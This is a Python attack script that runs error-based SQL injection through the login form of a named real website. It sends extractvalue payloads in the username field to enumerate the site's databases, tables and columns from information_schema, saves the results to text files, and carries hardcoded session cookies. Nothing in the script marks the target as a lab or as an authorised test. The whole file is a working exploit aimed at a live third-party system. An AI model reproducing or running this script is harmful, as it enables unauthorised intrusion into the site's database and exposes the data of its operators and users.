#!/usr/bin/env python

import requests
import sys
from bs4 import BeautifulSoup

# Used curl to python requests https://curl.trillworks.com/

cookies = {
    '__cfduid': 'd828ca59b283927820e0440ab64e920b51608532554',
    'PHPSESSID': '01af0pg6osit83hh0q1q1dcpe1',
}

headers = {
    'Host': 'www.onlinemadrasa.org',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': '33',
}



def databases():
    def database_count():
        payload = "admin' and extractvalue(0x0a,concat(0x0a,(select count(schema_name) from information_schema.schemata)))-- -"
        data = 'username='+ payload +'&pass=admin&submit='
        response = requests.post('https://www.onlinemadrasa.org/members/accounts/index.php', headers=headers, cookies=cookies, data=data, verify=True)
        html = response.text.splitlines()
        databases = html[1][:-1]
        print('[+] Total Databases: ' + databases)
        global db_count
        db_count = int(databases)+1
    database_count()

    def database_names():
        try:
            file = open('database_names.txt','w')
            for num in range(db_count):
                payload = "admin' and extractvalue(0x0a,concat(0x0a,(select concat(schema_name) from information_schema.schemata limit "+str(num)+",1)))-- -"
                data = 'username='+ payload +'&pass=admin&submit='
                response = requests.post('https://www.onlinemadrasa.org/members/accounts/index.php', headers=headers, cookies=cookies, data=data, verify=True)
                html = response.text.splitlines()
                db = html[1][:-1]
                print('[+] Database ' + str(num) + ': ' + db)
                file.write(db + '\n')
            file.close()
        except:
            print('[+] Done!')
    database_names()

if sys.argv[1] == '-D':
    databases()


def tables():
    def table_count():
        payload = "admin' and extractvalue(0x0a,concat(0x0a,(select count(table_name) from information_schema.tables where table_schema=database())))-- -"
        data = 'username='+ payload +'&pass=admin&submit='
        response = requests.post('https://www.onlinemadrasa.org/members/accounts/index.php', headers=headers, cookies=cookies, data=data, verify=True)
        html = response.text.splitlines()
        tables = html[1][:-1]
        print('[+] Total Tables: '+tables)
        global tbl_count
        tbl_count = int(tables)+1
    table_count()

    def table_names():
        try:
            file = open('table_names.txt','w')
            for num in range(tbl_count):
                payload = "admin' and extractvalue(0x0a,concat(0x0a,(select concat(table_name) from information_schema.tables where table_schema=database() limit "+str(num)+",1)))-- -"
                data = 'username='+ payload +'&pass=admin&submit='
                response = requests.post('https://www.onlinemadrasa.org/members/accounts/index.php', headers=headers, cookies=cookies, data=data, verify=True)
                html = response.text.splitlines()
                tbl = html[1][:-1]
                print('[+] Table ' + str(num) + ': ' + tbl)
                file.write(tbl + '\n')
            file.close()
        except:
            print('[+] Done!')
    table_names()

if sys.argv[1] == '-T':
    tables()


def columns():
    def columns_count():
        payload = "admin' and extractvalue(0x0a,concat(0x0a,(select count(column_name) from information_schema.columns where table_schema=database())))-- -"
        data = 'username='+ payload +'&pass=admin&submit='
        response = requests.post('https://www.onlinemadrasa.org/members/accounts/index.php', headers=headers, cookies=cookies, data=data, verify=True)
        html = response.text.splitlines()
        columns = html[1][:-1]
        print('[+] Total Columns: ' + columns)
        global col_count
        col_count = int(columns)+1
    columns_count()

    def column_names():
        try:
            file = open('column_names.txt','w')
            for num in range(col_count):
                payload = "admin' and extractvalue(0x0a,concat(0x0a,(select concat(column_name) from information_schema.columns where table_schema=database() limit "+str(num)+",1)))-- -"
                data = 'username='+ payload +'&pass=admin&submit='
                response = requests.post('https://www.onlinemadrasa.org/members/accounts/index.php', headers=headers, cookies=cookies, data=data, verify=True)
                html = response.text.splitlines()
                columns = html[1][:-1]
                print('[+] column ' + str(num) + ': ' + columns)
                file.write(columns + '\n')
            file.close()
        except:
            print('[+] Done!')
    column_names()

if sys.argv[1] == '-C':
    columns()

